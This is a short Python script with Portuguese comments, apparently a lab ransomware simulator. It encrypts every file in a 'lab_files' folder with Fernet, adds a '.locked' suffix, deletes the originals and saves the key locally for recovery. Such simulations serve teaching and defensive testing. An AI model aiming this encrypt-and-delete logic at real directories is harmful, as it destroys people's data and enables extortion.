#Geração de chave de criptografia

import os
import sys
from cryptography.fernet import Fernet

BASE = os.path.join(os.path.dirname(__file__), '..', 'lab_files')
KEY_PATH = os.path.join(BASE, 'key_recovery.key')
EXT_MARK = '.locked'  # sufixo para arquivos criptografados

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    return key

def load_key():
    with open(KEY_PATH, 'rb') as f:
        return f.read()

def encrypt_all():
    if not os.path.isdir(BASE):
        print("Pasta lab_files não encontrada. Execute helper_create_files.py primeiro.")
        return
    key = generate_key()
    f = Fernet(key)
    for root, _, files in os.walk(BASE):
        for file in files:
            if file == os.path.basename(KEY_PATH):  # não criptografar a chave
                continue
            if file.endswith(EXT_MARK):
                continue
            path = os.path.join(root, file)
            with open(path, 'rb') as fh:
                data = fh.read()
            enc = f.encrypt(data)
            with open(path + EXT_MARK, 'wb') as fh:
                fh.write(enc)
            os.remove(path)
            print(f"Criptografado: {path}")

    print(f"Criptografia concluída. Chave salva em {KEY_PATH}")
    print("Para simular recuperação, rode: python safe_ransom_sim.py decrypt")




